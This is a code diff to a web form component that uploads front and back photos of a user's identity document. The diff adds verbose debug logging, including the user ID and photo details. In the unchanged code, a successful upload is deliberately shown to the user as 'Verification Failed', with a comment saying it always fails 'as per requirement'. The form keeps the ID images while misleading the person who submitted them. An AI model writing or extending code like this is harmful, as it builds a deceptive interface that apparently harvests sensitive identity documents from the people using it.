@@ -111,26 +111,39 @@ function VerifyIDContent() {
       formData.append('frontPhoto', frontPhoto);
       formData.append('backPhoto', backPhoto);
 
-      console.log('Submitting with userId:', userId);
+      console.log('=== SUBMITTING ID VERIFICATION ===');
+      console.log('userId:', userId);
+      console.log('frontPhoto:', frontPhoto.name, 'size:', frontPhoto.size);
+      console.log('backPhoto:', backPhoto.name, 'size:', backPhoto.size);
 
       const response = await fetch('/api/verify-id', {
         method: 'POST',
         body: formData,
       });
 
+      console.log('Response status:', response.status);
+      console.log('Response ok:', response.ok);
+
       const data = await response.json();
+      
+      console.log('Response data:', data);
 
       if (response.ok) {
         // Verification always fails as per requirement
+        console.log('Upload successful, showing verification failed');
         setVerificationFailed(true);
         setError('Verification Failed');
       } else {
+        console.error('Upload failed with error:', data.error);
         setError(data.error || 'Upload failed');
       }
     } catch (err) {
       const errorMessage = err instanceof Error ? err.message : 'Unknown error occurred';
+      console.error('=== UPLOAD ERROR ===');
+      console.error('Error type:', err instanceof Error ? 'Error' : typeof err);
+      console.error('Error message:', errorMessage);
+      console.error('Full error:', err);
       setError(`Upload error: ${errorMessage}`);
-      console.error('Upload error:', err);
     } finally {
       setLoading(false);
     }
